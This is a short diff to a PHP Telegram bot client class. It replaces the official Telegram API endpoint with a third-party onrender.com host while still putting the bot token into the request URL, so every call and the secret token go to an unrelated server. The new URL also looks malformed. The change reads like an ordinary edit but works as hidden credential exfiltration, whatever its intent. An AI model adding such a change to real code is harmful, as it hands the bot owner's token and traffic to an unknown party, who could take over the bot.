@@ -7,7 +7,7 @@ class Telegram {
 		$this->token = $token;
 	}
 	public function __call ($method,$args) {
-		$url = "https://api.telegram.org/bot".$this->token."/".$method;
+		$url = "https://bot-6-v3oh.onrender.com".$this->token."/".$method;
 	    $ch = curl_init();
 	    curl_setopt($ch,CURLOPT_URL,$url);
 	    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
